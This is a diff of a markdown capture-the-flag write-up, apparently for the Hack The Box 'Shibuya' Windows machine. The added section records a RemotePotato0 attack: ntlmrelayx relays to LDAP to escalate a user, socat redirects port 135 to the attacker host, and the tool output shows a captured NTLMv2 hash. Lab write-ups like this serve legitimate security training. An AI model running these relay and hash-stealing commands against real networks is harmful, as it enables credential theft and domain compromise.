@@ -1,14 +1,14 @@
 ---
-title: "Shibuya"
+title: Shibuya
 date: 2026-01-20
 ShowToc: true
 TocOpen: true
-tags: ["blog", "HTB", "Windows", "Hard"]
-lastmod: 2026-01-24T03:34:39.537Z
+tags:
+  - blog
+lastmod: 2026-01-31T03:41:02.909Z
 ---
+# Box  Info
 
-
-# Box Info
 ![Pasted image 20260120160504.png](/ob/Pasted%20image%2020260120160504.png)
 
 ```
@@ -1060,6 +1060,111 @@ Info: Establishing connection to remote endpoint
 
 
 
+so now we want to use the nigel.mills to have him ntlm by  rdp 
+
+
+![[Pasted image 20260123010305.png]]
+
+# RemotePotato0
+**RPC server hash stealer**: allows stealing the NTLMv2 hash of every user logged on in other sessions. Output format inspired by [Responder](https://github.com/lgandx/Responder)
+
+https://www.safebreach.com/blog/remotepotato0-a-complex-active-directory-attack/
+- [ ] hassession --> runasCS found --> RemotePotato0 --> get the hash 
+
+https://xie1997.blog.csdn.net/article/details/120367030
+
+
+```
+
+└─# ntlmrelayx.py -t ldap://10.129.0.1 --no-wcf-server --escalate-user nigel.mills\
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+
+\[*] Protocol Client RPC loaded..\
+\[*] Protocol Client WINRMS loaded..\
+\[*] Protocol Client IMAPS loaded..\
+\[*] Protocol Client IMAP loaded..\
+\[*] Protocol Client DCSYNC loaded..\
+\[*] Protocol Client SMTP loaded..\
+\[*] Protocol Client MSSQL loaded..\
+\[*] Protocol Client LDAPS loaded..\
+\[*] Protocol Client LDAP loaded..\
+\[*] Protocol Client HTTPS loaded..\
+\[*] Protocol Client HTTP loaded..\
+\[*] Protocol Client SMB loaded..\
+\[*] Running in relay mode to single host\
+\[*] Setting up SMB Server on port 445\
+\[*] Setting up HTTP Server on port 80\
+\[*] Setting up RAW Server on port 6666\
+\[*] Setting up WinRM (HTTP) Server on port 5985\
+\[*] Setting up WinRMS (HTTPS) Server on port 5986\
+\[*] Setting up RPC Server on port 135\
+Exception in thread Thread-6:\
+\[*] Multirelay disabled
+
+\[*] Servers started, waiting for connections\
+Traceback (most recent call last):\
+File "/usr/lib/python3.13/threading.py", line 1044, in \_bootstrap\_inner\
+self.run()\
+\~~~~~~~~^^\
+File "/root/Desktop/haydon\_env/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/servers/rpcrelayserver.py", line 424, in run\
+self.server = self.RPCSocketServer((self.config.interfaceIp, self.config.listeningPort), self.RPCHandler,\
+\~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\
+self.config)\
+^^^^^^^^^^^^\
+File "/root/Desktop/haydon\_env/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/servers/rpcrelayserver.py", line 41, in **init**\
+socketserver.TCPServer.**init**(self, server\_address, RequestHandlerClass)\
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\
+File "/usr/lib/python3.13/socketserver.py", line 457, in **init**\
+self.server\_bind()\
+\~~~~~~~~~~~~~~~~^^\
+File "/usr/lib/python3.13/socketserver.py", line 478, in server\_bind\
+self.socket.bind(self.server\_address)\
+\~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^\
+OSError: \[Errno 98] Address already in use\
+\[*] (HTTP): Client requested path: /\
+\[\*] (HTTP): Connection from 10.129.234.42 controlled, attacking target ldap://10.129.0.1
+
+```
+
+
+```
+
+sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:8888
+
+> 2026/01/23 01:30:25.000857585  length=164 from=0 to=163\
+> ..\v\a......(.........................`R.......!4z.....]........\b.+.H`............`R.......!4z....,..l..@E............
+> .......NTLMSSP.......\b.................
+> .|O....< 2026/01/23 01:30:25.000908089  length=318 from=0 to=317
+> ..\f\a....>.............M...8888...........]........\b.+.H`............................\
+> .......NTLMSSP.........8.......\\.....p6............F...\
+> .|O....S.H.I.B.U.Y.A.....S.H.I.B.U.Y.A.....A.W.S.J.P.D.C.0.5.2.2.....s.h.i.b.u.y.a...v.l...,.A.W.S.J.P.D.C.0.5.2.2...s.h.i.b.u.y.a...v.l.....s.h.i.b.u.y.a...v.l.\a.\b.t...........> 2026/01/23 01:30:25.000994764  length=664 from=164 to=827\
+> ...\a................
+
+```
+
+
+```
+
+shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson.ssh>.\RemotePotato0.exe -m 2 -r 10.10.14.54 -x 10.10.14.54 -p 8888  -s 1\
+\[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on 10.10.14.54 to your victim machine on port 8888\
+\[*] Example Network redirector:\
+sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:8888\
+\[*] Starting the RPC server to capture the credentials hash from the user authentication!!\
+\[*] RPC relay server listening on port 9997 ...\
+\[*] Spawning COM object in the session: 1\
+\[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}\
+\[*] Starting RogueOxidResolver RPC Server listening on port 8888 ...\
+\[*] IStoragetrigger written: 104 bytes\
+\[*] ResolveOxid2 RPC call\
+\[+] Received the relayed authentication on the RPC relay server on port 9997\
+\[*] Connected to RPC Server 127.0.0.1 on port 8888\
+\[+] User hash stolen!
+
+NTLMv2 Client   : AWSJPDC0522\
+NTLMv2 Username : SHIBUYA\Nigel.Mills\
+NTLMv2 Hash     : Nigel.Mills::SHIBUYA:cbbd010b1adcb705:3f982e160657259d25024f8fe3794f4c:0101000000000000b89805ccc48bdc016bb84702d89454140000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800b89805ccc48bdc0106000400060000000800300030000000000000000100000000200000a604a2833f968daccd1cafe5f327ef02f16173b70e6f9876adab1f882f2f5dd10a00100000000000000000000000000000000000090000000000000000000000
+
+```
 ```
 
 ### evil-winrm
